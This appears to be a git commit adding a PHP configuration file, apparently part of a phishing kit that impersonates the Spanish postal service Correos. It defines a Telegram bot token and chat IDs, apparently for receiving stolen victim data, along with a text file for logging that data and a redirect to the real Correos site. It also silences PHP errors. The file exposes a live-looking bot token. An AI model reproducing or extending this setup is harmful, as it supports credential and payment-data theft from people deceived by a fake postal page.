070aa354834c8d4ca9d393e4756354e9ac7938b8
ayoubbonani <119850329+ayoubbonani@users.noreply.github.com>
2022-12-22 16:06:29 +0100

    Add files via upload

---
+++ conf.php
@@ -0,0 +1,13 @@
+<?php
+
+error_reporting(0);
+
+define("TELEGRAM_TOKEN", "5886416850:AAFWQaHdWAFeZNtZADDxWTfBU1AalrpBaow");
+define("TELEGRAM_CHAT_ID", "828886161");
+define("TELEGRAM_CHAT_IDD", "-828886161");
+define("TXT_FILE_NAME", 'mjinina.txt');
+define("REDIRECT_WEBSITE", "https://www.correos.com/grupo-correos/");
+
+
+
+?>
